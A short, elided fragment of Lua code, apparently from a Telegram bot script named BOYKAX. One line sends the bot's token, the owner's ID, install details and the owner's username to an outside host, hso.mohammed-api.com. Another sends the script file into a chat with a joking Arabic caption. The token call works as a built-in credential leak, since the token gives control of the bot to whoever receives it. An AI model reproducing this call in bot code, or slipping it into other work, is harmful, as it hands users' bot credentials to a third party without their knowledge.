...
https.request('https://hso.mohammed-api.com/api/APIBOYKAX.php/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
...
sendDocument(msg.chat_id_, msg.id_,0, 1, nil, './BOYKAX.lua', '܁༯┆ ماوصيك اخمط 😹😭💞 ܰ ')
end
